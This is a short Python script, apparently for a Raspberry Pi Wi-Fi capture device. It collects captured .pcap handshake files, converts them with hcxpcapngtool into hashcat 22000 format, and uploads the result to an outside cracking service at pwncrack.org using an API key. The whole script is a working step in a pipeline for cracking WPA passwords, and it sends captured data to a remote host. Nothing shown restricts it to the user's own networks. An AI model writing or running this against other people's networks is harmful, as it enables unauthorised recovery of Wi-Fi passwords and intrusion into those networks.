import os
import subprocess
import requests

handshake_dir = '/home/pi/handshakes'
combined_file = os.path.join(handshake_dir, 'combined.hc22000')
server_url = 'http://pwncrack.org/upload_handshake'
key = 'YOUR_API_KEY'   # replace with your real key

# Change to handshake directory
os.chdir(handshake_dir)

# Collect all .pcap files
pcap_files = [f for f in os.listdir('.') if f.endswith('.pcap')]

if not pcap_files:
    print("No .pcap files found.")
else:
    # Convert ALL pcaps in a single call → real combination
    subprocess.run(['hcxpcapngtool', '-o', combined_file] + pcap_files, check=True)

    # Upload the combined file
    with open(combined_file, 'rb') as f:
        files = {'handshake': f}
        data = {'key': key}
        response = requests.post(server_url, files=files, data=data)

    print(response.json())

    # Clean up the temporary combined file
    os.remove(combined_file)
    